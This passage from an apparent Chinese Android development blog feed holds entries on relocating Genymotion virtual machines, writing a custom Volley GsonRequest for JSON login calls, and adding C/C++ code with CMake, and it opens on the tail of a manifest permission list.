android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;com.android.launcher.permission.UNINSTALL_SHORTCUT&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;com.android.launcher.permission.INSTALL_SHORTCUT&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.SYSTEM_ALERT_WINDOW&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.GET_TASKS&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.READ_CALL_LOG&quot;/&gt;</span><br><span class="line">    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;/&gt;</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Genymotion更改模拟器的存放路径</title>
    <url>/Android/genymotion%E6%9B%B4%E6%94%B9%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%9A%84%E5%AD%98%E6%94%BE%E8%B7%AF%E5%BE%84/</url>
    <content><![CDATA[<p>Genymotion模拟器下载的虚拟机默认是在C盘，如果要修改虚拟机的路径，在设置里修改即可，但是先存的虚拟机genymotion不会帮你移动。</p>
<p>我们手动移动虚拟机，比如移动到D盘，那这些的虚拟机都失效了，Genymotion并不支持导入。</p>
<p>修改 C:\Users\用户名.VirtualBox\VirtualBox.xml 文件 :</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">MachineRegistry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">MachineEntry</span> <span class="attr">uuid</span>=<span class="string">"&#123;a9a20fe7-dc69-4869-8f8b-1feff2485745&#125;"</span> <span class="attr">src</span>=<span class="string">"D:\GenymotionDevice\Google Pixel - 9.0\Google Pixel - 9.0.vbox"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">MachineEntry</span> <span class="attr">uuid</span>=<span class="string">"&#123;a9a20fe7-dc69-4869-8f8b-1feff2485745&#125;"</span> <span class="attr">src</span>=<span class="string">"D:\GenymotionDevice\Google Pixel - 8.0\Google Pixel - 8.0.vbox"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">MachineRegistry</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将路径改正确即可，如果不小心删掉了，也可以在xml里面增加一个item，按照他的格式来写，其中uuid在虚拟机的vbox文件里面可以找到。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>genymotion</tag>
      </tags>
  </entry>
  <entry>
    <title>写一个Volley自定义Request</title>
    <url>/Android/%E5%86%99%E4%B8%80%E4%B8%AAVolley%E8%87%AA%E5%AE%9A%E4%B9%89%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<p>参考：<a href="https://developer.android.google.cn/training/volley/request-custom" target="_blank" rel="noopener">request-custom</a></p>
<p>在Android中，使用Volley来请求JSON数据，Volley自带 <code>StringRequest</code>  <code>JsonObjectRequest</code> <code>JsonArrayRequest</code>   <code>JsonRequest</code> </p>
<h3 id="GET示例"><a href="#GET示例" class="headerlink" title="GET示例"></a>GET示例</h3><p>自定义Request，就是在Request中使用Gson把数据处理为对象，返回给调用者。示例 GsonRequestSample.java  (GET Request)：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代码来自：https://developer.android.google.cn/training/volley/request-custom</span></span><br><span class="line"><span class="keyword">import</span> com.android.volley.AuthFailureError;</span><br><span class="line"><span class="keyword">import</span> com.android.volley.NetworkResponse;</span><br><span class="line"><span class="keyword">import</span> com.android.volley.ParseError;</span><br><span class="line"><span class="keyword">import</span> com.android.volley.Request;</span><br><span class="line"><span class="keyword">import</span> com.android.volley.Response;</span><br><span class="line"><span class="keyword">import</span> com.android.volley.toolbox.HttpHeaderParser;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.JsonSyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GsonRequestSample</span>&lt;<span class="title">T</span>&gt; <span class="keyword">extends</span> <span class="title">Request</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Gson gson = <span class="keyword">new</span> Gson();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;T&gt; clazz;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, String&gt; headers;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Response.Listener&lt;T&gt; listener;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Make a GET request and return a parsed object from JSON.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> url URL of the request to make</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz Relevant class object, for Gson's reflection</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> headers Map of request headers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GsonRequestSample</span><span class="params">(String url, Class&lt;T&gt; clazz, Map&lt;String, String&gt; headers,</span></span></span><br><span class="line"><span class="function"><span class="params">                             Response.Listener&lt;T&gt; listener, Response.ErrorListener errorListener)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(Method.GET, url, errorListener);</span><br><span class="line">        <span class="keyword">this</span>.clazz = clazz;</span><br><span class="line">        <span class="keyword">this</span>.headers = headers;</span><br><span class="line">        <span class="keyword">this</span>.listener = listener;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, String&gt; <span class="title">getHeaders</span><span class="params">()</span> <span class="keyword">throws</span> AuthFailureError </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> headers != <span class="keyword">null</span> ? headers : <span class="keyword">super</span>.getHeaders();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">deliverResponse</span><span class="params">(T response)</span> </span>&#123;</span><br><span class="line">        listener.onResponse(response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Response&lt;T&gt; <span class="title">parseNetworkResponse</span><span class="params">(NetworkResponse response)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String json = <span class="keyword">new</span> String(</span><br><span class="line">                    response.data,</span><br><span class="line">                    HttpHeaderParser.parseCharset(response.headers));</span><br><span class="line">            <span class="keyword">return</span> Response.success(</span><br><span class="line">                    gson.fromJson(json, clazz),</span><br><span class="line">                    HttpHeaderParser.parseCacheHeaders(response));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> Response.error(<span class="keyword">new</span> ParseError(e));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonSyntaxException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> Response.error(<span class="keyword">new</span> ParseError(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修改为POST"><a href="#修改为POST" class="headerlink" title="修改为POST"></a>修改为POST</h3><p>现在，把以上的示例改为用户登录接口，使其支持 POST Request，参数已JSON的格式发送，响应为JSON格式数据，转为本地Bean类。</p>
<h4 id="请求体"><a href="#请求体" class="headerlink" title="请求体:"></a>请求体:</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/users/login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: api.666.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    "email":"sam@qq.com",</span><br><span class="line">    "password":"123456"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意要加入Header：<code>&quot;Content-Type&quot;,&quot;application/json&quot;</code> </p>
</blockquote>
<h4 id="响应"><a href="#响应" class="headerlink" title="响应:"></a>响应:</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"code"</span>: <span class="number">200</span>,</span><br><span class="line">  <span class="attr">"token"</span>: <span class="string">"1234567890"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="代码-GsonRequest-java-："><a href="#代码-GsonRequest-java-：" class="headerlink" title="代码(GsonRequest.java)："></a>代码(GsonRequest.java)：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.android.volley.AuthFailureError;</span><br><span class="line"><span class="keyword">import</span> com.android.volley.NetworkResponse;</span><br><span class="line"><span class="keyword">import</span> com.android.volley.ParseError;</span><br><span class="line"><span class="keyword">import</span> com.android.volley.Request;</span><br><span class="line"><span class="keyword">import</span> com.android.volley.Response;</span><br><span class="line"><span class="keyword">import</span> com.android.volley.toolbox.HttpHeaderParser;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.JsonSyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GsonRequest</span>&lt;<span class="title">T</span>&gt; <span class="keyword">extends</span> <span class="title">Request</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Gson gson = <span class="keyword">new</span> Gson();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;T&gt; clazz;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt; headers;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, String&gt; params;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Response.Listener&lt;T&gt; listener;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Make a POST request and return a parsed object from JSON.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> url URL of the request to make</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz Relevant class object, for Gson's reflection</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> headers Map of request headers</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> headers Map of request json body</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GsonRequest</span><span class="params">(String url, Class&lt;T&gt; clazz, Map&lt;String, String&gt; headers, Map&lt;String, String&gt; body,</span></span></span><br><span class="line"><span class="function"><span class="params">                       Response.Listener&lt;T&gt; listener, Response.ErrorListener errorListener)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(Method.POST, url, errorListener);</span><br><span class="line">        <span class="keyword">this</span>.clazz = clazz;</span><br><span class="line">        <span class="keyword">this</span>.headers = headers;</span><br><span class="line">        <span class="keyword">this</span>.params = body;</span><br><span class="line">        <span class="keyword">this</span>.listener = listener;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GsonRequest</span><span class="params">(<span class="keyword">int</span> type,String url, Class&lt;T&gt; clazz, Map&lt;String, String&gt; headers, Map&lt;String, String&gt; params,</span></span></span><br><span class="line"><span class="function"><span class="params">                       Response.Listener&lt;T&gt; listener, Response.ErrorListener errorListener)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(type, url, errorListener);</span><br><span class="line">        <span class="keyword">this</span>.clazz = clazz;</span><br><span class="line">        <span class="keyword">this</span>.headers = headers;</span><br><span class="line">        <span class="keyword">this</span>.params = params;</span><br><span class="line">        <span class="keyword">this</span>.listener = listener;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] getBody()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] body = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(params!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            JSONObject jsonObject = <span class="keyword">new</span> JSONObject(params);</span><br><span class="line">            body = jsonObject.toString().getBytes();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> body;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, String&gt; <span class="title">getHeaders</span><span class="params">()</span> <span class="keyword">throws</span> AuthFailureError </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(headers == <span class="keyword">null</span>)&#123;</span><br><span class="line">            headers = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        headers.put(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> headers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">deliverResponse</span><span class="params">(T response)</span> </span>&#123;</span><br><span class="line">        listener.onResponse(response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Response&lt;T&gt; <span class="title">parseNetworkResponse</span><span class="params">(NetworkResponse response)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String json = <span class="keyword">new</span> String(</span><br><span class="line">                    response.data,</span><br><span class="line">                    HttpHeaderParser.parseCharset(response.headers));</span><br><span class="line">            <span class="keyword">return</span> Response.success(</span><br><span class="line">                    gson.fromJson(json, clazz),</span><br><span class="line">                    HttpHeaderParser.parseCacheHeaders(response));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> Response.error(<span class="keyword">new</span> ParseError(e));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonSyntaxException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> Response.error(<span class="keyword">new</span> ParseError(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="调用："><a href="#调用：" class="headerlink" title="调用："></a>调用：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">(String username,</span></span></span><br><span class="line"><span class="function"><span class="params">                  String passwd,</span></span></span><br><span class="line"><span class="function"><span class="params">                  Response.Listener&lt;LoginBean&gt; listener,</span></span></span><br><span class="line"><span class="function"><span class="params">                  Response.ErrorListener error)</span></span>&#123;</span><br><span class="line">  <span class="keyword">final</span> String url = BASE_URL + <span class="string">"/api/users/login"</span>;</span><br><span class="line">  Map&lt;String ,String &gt;params = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">  params.put(<span class="string">"email"</span>,username);</span><br><span class="line">  params.put(<span class="string">"password"</span>, passwd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  GsonRequest&lt;LoginBean&gt; gsonRequest = <span class="keyword">new</span> GsonRequest&lt;&gt;(</span><br><span class="line">    url,</span><br><span class="line">    LoginBean<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">    <span class="title">null</span>,</span></span><br><span class="line"><span class="class">    <span class="title">params</span>,</span></span><br><span class="line"><span class="class">    <span class="title">listener</span>,</span></span><br><span class="line"><span class="class">    <span class="title">error</span>)</span>;</span><br><span class="line">  requestQueue.add(request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginBean</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> String token;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCode</span><span class="params">(<span class="keyword">int</span> code)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setToken</span><span class="params">(String token)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.token = token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用起来就很方便了，监听响应结果。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(LoginBean response)</span> </span>&#123;</span><br><span class="line">  Log.d(TAG, <span class="string">"onResponse: "</span>+response.getToken());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>向您的Android项目添加 C 和 C++ 代码</title>
    <url>/Android/%E5%90%91%E6%82%A8%E7%9A%84Android%E9%A1%B9%E7%9B%AE%E6%B7%BB%E5%8A%A0C%E5%92%8CC++%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<blockquote>
<p>本文是拷贝  <a href="https://developer.android.google.cn/studio/projects/add-native-code.html" target="_blank" rel="noopener">google.cn</a> ，更新时间是文章的发表时间。</p>
</blockquote>
<p>搭配使用 Android Studio 2.2 或更高版本与 Android Plugin for Gradle 版本 2.2.0 或更高版本时，您可以将 C 和 C++ 代码编译到 Gradle 与 APK 一起打包的原生库中，将这类代码添加到您的应用中。您的 Java 代码随后可以通过 Java 原生接口 (JNI) 调用您的原生库中的函数。如果您想要详细了解如何使用 JNI 框架，请阅读 Android 的 JNI 提示。</p>
<p>Android Studio 用于构建原生库的默认工具是 CMake。由于很多现有项目都使用构建工具包编译其原生代码，Android Studio 还支持 ndk-build。如果您想要将现有的 ndk-build 库导入到您的 Android Studio 项目中，请参阅介绍如何配置 Gradle 以关联到您的原生库的部分。不过，如果您在创建新的原生库，则应使用 CMake。</p>
<p>本页面介绍的信息可以帮助您使用所需构建工具设置 Android Studio、创建或配置项目以支持 Android 上的原生代码，以及构建和运行应用。 </p>
<blockquote>
<p>注：如果您的现有项目使用已弃用的 <code>ndkCompile</code> 工具，则应先打开 <code>build.properties</code> 文件，并移除以下代码行，然后再<a href="https://developer.android.google.cn/studio/projects/add-native-code.html#link-gradle" target="_blank" rel="noopener">将 Gradle 关联到您的原生库</a>： </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// Remove this line</span><br><span class="line">android.useDeprecatedNdk = true</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>实验性 Gradle 的用户注意事项</strong>：如果您是以下任意一种情况，请考虑<a href="http://tools.android.com/tech-docs/new-build-system/gradle-experimental/migrate-to-stable" target="_blank" rel="noopener">迁移到插件版本 2.2.0 或更高版本</a>并使用 CMake 或 ndk-build 构建原生库：您的原生项目已经使用 CMake 或者 ndk-build；但是您想要使用稳定版本的 Gradle 构建系统；或者您希望支持插件工具，例如 <a href="https://ccache.samba.org/" target="_blank" rel="noopener">CCache</a>。否则，您可以继续<a href="http://tools.android.com/tech-docs/new-build-system/gradle-experimental" target="_blank" rel="noopener">使用实验性版本的 Gradle 和 Android 插件</a>。</p>
</blockquote>
<h3 id="下载-NDK-和构建工具"><a href="#下载-NDK-和构建工具" class="headerlink" title="下载 NDK 和构建工具"></a>下载 NDK 和构建工具</h3><p>要为您的应用编译和调试原生代码，您需要以下组件： </p>
<ul>
<li><a href="https://developer.android.google.cn/ndk/index.html" target="_blank" rel="noopener">Android 原生开发工具包 (NDK)</a>：这套工具集允许您为 Android 使用 C 和 C++ 代码，并提供众多平台库，让您可以管理原生 Activity 和访问物理设备组件，例如传感器和触摸输入。</li>
<li><a href="https://cmake.org/" target="_blank" rel="noopener">CMake</a>：一款外部构建工具，可与 Gradle 搭配使用来构建原生库。如果您只计划使用 ndk-build，则不需要此组件。</li>
<li><a href="http://lldb.llvm.org/" target="_blank" rel="noopener">LLDB</a>：一种调试程序，Android Studio 使用它来调试原生代码。</li>
</ul>
<p>您可以<a href="https://developer.android.google.cn/studio/intro/update.html#sdk-manager" target="_blank" rel="noopener">使用 SDK 管理器</a>安装这些组件：</p>
<ol>
<li>在打开的项目中，从菜单栏选择 Tools &gt; Android &gt; SDK Manager。</li>
<li>点击 <strong>SDK Tools</strong> 标签。</li>
<li>选中 <strong>LLDB</strong>、<strong>CMake</strong> 和 <strong>NDK</strong> 旁的复选框，如图 1 所示。<br> <img src="/images/android/从 SDK 管理器中安装 LLDB、CMake 和 NDK.png" alt=" 图 1. 从 SDK 管理器中安装 LLDB、CMake 和 NDK。"></li>
<li>点击 Apply，然后在弹出式对话框中点击 OK。</li>
<li>安装完成后，点击 Finish，然后点击 OK。</li>
</ol>
<h3 id="创建支持-C-C-的新项目"><a href="#创建支持-C-C-的新项目" class="headerlink" title="创建支持 C/C++ 的新项目"></a>创建支持 C/C++ 的新项目</h3><p>创建支持原生代码的项目与创建任何其他 Android Studio 项目类似，不过前者还需要额外几个步骤： </p>
<ol>
<li>在向导的 <strong>Configure your new project</strong> 部分，选中 Include C++ Support 复选框。</li>
<li>点击 <strong>Next</strong>。</li>
<li>正常填写所有其他字段并完成向导接下来的几个部分。</li>
<li>在向导的 <strong>Customize C++ Support</strong> 部分，您可以使用下列选项自定义项目：<ul>
<li><strong>C++ Standard</strong>：使用下拉列表选择您希望使用哪种 C++ 标准。选择 <strong>Toolchain Default</strong> 会使用默认的 CMake 设置。</li>
<li><strong>Exceptions Support</strong>：如果您希望启用对 C++ 异常处理的支持，请选中此复选框。如果启用此复选框，Android Studio 会将 -fexceptions 标志添加到模块级 build.gradle 文件的 cppFlags 中，Gradle 会将其传递到 CMake。</li>
<li><strong>Runtime Type Information Support</strong>：如果您希望支持 RTTI，请选中此复选框。如果启用此复选框，Android Studio 会将 -frtti 标志添加到模块级 build.gradle 文件的 cppFlags 中，Gradle 会将其传递到 CMake。</li>
</ul>
</li>
<li>点击 <strong>Finish</strong>。<br>在 Android Studio 完成新项目的创建后，请从 IDE 左侧打开 <strong>Project</strong> 窗格并选择 <strong>Android</strong> 视图。如图 2 中所示，Android Studio 将添加 <strong>cpp</strong> 和 <strong>External Build Files</strong> 组：<br><img src="/images/android/您的原生源文件和外部构建脚本的.png" alt=" 图 2. 您的原生源文件和外部构建脚本的 Android 视图组。"></li>
</ol>
<blockquote>
<p>注：此视图无法反映磁盘上的实际文件层次结构，而是将相似文件分到一组中，简化项目导航。 </p>
</blockquote>
<ol>
<li><p>在 <strong>cpp </strong>组中，您可以找到属于项目的所有原生源文件、标头和预构建库。对于新项目，Android Studio 会创建一个示例 C++ 源文件 native-lib.cpp，并将其置于应用模块的 src/main/cpp/ 目录中。本示例代码提供了一个简单的 C++ 函数 stringFromJNI()，此函数可以返回字符串“Hello from C++”。要了解如何向项目添加其他源文件，请参阅介绍如何 <a href="https://developer.android.google.cn/studio/projects/add-native-code.html#create-sources" target="_blank" rel="noopener">创建新的原生源文件</a> 的部分。 </p>
</li>
<li><p>在 <strong>External Build Files</strong> 组中，您可以找到 CMake 或 ndk-build 的构建脚本。与 build.gradle 文件指示 Gradle 如何构建应用一样，CMake 和 ndk-build 需要一个构建脚本来了解如何构建您的原生库。对于新项目，Android Studio 会创建一个 CMake 构建脚本 CMakeLists.txt，并将其置于模块的根目录中。要详细了解此构建脚本的内容，请参阅介绍如何 <a href="https://developer.android.google.cn/studio/projects/add-native-code.html#create-cmake-script" target="_blank" rel="noopener">创建 Cmake 构建脚本</a> 的部分。</p>
</li>
</ol>
<h4 id="构建和运行示例应用"><a href="#构建和运行示例应用" class="headerlink" title="构建和运行示例应用"></a>构建和运行示例应用</h4><p>点击 <strong>Run</strong> 从菜单栏运行应用 后，Android Studio 将在您的 Android 设备或者模拟器上构建并启动一个显示文字“Hello from C++”的应用。下面的概览介绍了构建和运行示例应用时会发生的事件： </p>
<ol>
<li>Gradle 调用您的外部构建脚本 <code>CMakeLists.txt</code>。</li>
<li>CMake 按照构建脚本中的命令将 C++ 源文件 <code>native-lib.cpp</code> 编译到共享的对象库中，并命名为 <code>libnative-lib.so</code>，Gradle 随后会将其打包到 APK 中。</li>
<li>运行时，应用的 <code>MainActivity</code> 会使用 <a href="https://developer.android.google.cn/reference/java/lang/System.html#loadLibrary(java.lang.String" target="_blank" rel="noopener">System.loadLibrary() </a>)加载原生库。现在，应用可以使用库的原生函数 <code>stringFromJNI()</code>。</li>
<li><code>MainActivity.onCreate()</code> 调用 <code>stringFromJNI()</code>，这将返回“Hello from C++”并使用这些文字更新 TextView。</li>
</ol>
<blockquote>
<p>注：<a href="https://developer.android.google.cn/studio/run/index.html#instant-run" target="_blank" rel="noopener">Instant Run</a> 与使用原生代码的项目不兼容。Android Studio 会自动停用此功能。 </p>
</blockquote>
<p>如果您想要验证 Gradle 是否已将原生库打包到 APK 中，可以使用 <a href="https://developer.android.google.cn/studio/build/apk-analyzer.html" target="_blank" rel="noopener">APK 分析器</a>： </p>
<ol>
<li>选择 <strong>Build &gt; Analyze APK</strong>。</li>
<li>从 <code>app/build/outputs/apk/</code> 目录中选择 APK 并点击 OK。</li>
<li>如图 3 中所示，您会在 APK 分析器窗口的 <code>lib/&lt;ABI&gt;/</code> 下看到 <code>libnative-lib.so</code>。<br> <img src="/images/android/分析器定位原生库.png" alt="图 3. 使用 APK 分析器定位原生库。"></li>
</ol>
<blockquote>
<p><strong>提示</strong>：如果您想要试验使用原生代码的其他 Android 应用，请点击 <strong>File &gt; New &gt; Import Sample</strong> 并从 <strong>Ndk</strong> 列表中选择示例项目。 </p>
</blockquote>
<h3 id="向现有项目添加-C-C-代码"><a href="#向现有项目添加-C-C-代码" class="headerlink" title="向现有项目添加 C/C++ 代码"></a>向现有项目添加 C/C++ 代码</h3><p>如果您希望向现有项目添加原生代码，请执行以下步骤：</p>
<ol>
<li><a href="https://developer.android.google.cn/studio/projects/add-native-code.html#create-sources" target="_blank" rel="noopener">创建新的原生源文件</a>并将其添加到您的 Android Studio 项目中。<ul>
<li>如果您已经拥有原生代码或想要导入预构建的原生库，则可以跳过此步骤。</li>
</ul>
</li>
<li><a href="https://developer.android.google.cn/studio/projects/add-native-code.html#create-cmake-script" target="_blank" rel="noopener">创建CMake构建脚本</a>，将您的原生源代码构建到库中。如果导入和关联预构建库或平台库，您也需要此构建脚本。<ul>
<li>如果您的现有原生库已经拥有 CMakeLists.txt 构建脚本或者使用 ndk-build 并包含 Android.mk 构建脚本，则可以跳过此步骤。</li>
</ul>
</li>
<li>提供一个指向您的 CMake 或 ndk-build 脚本文件的路径，将 Gradle 关联到您的原生库。Gradle 使用构建脚本将源代码导入您的 Android Studio 项目并将原生库（SO 文件）打包到 APK 中。</li>
</ol>
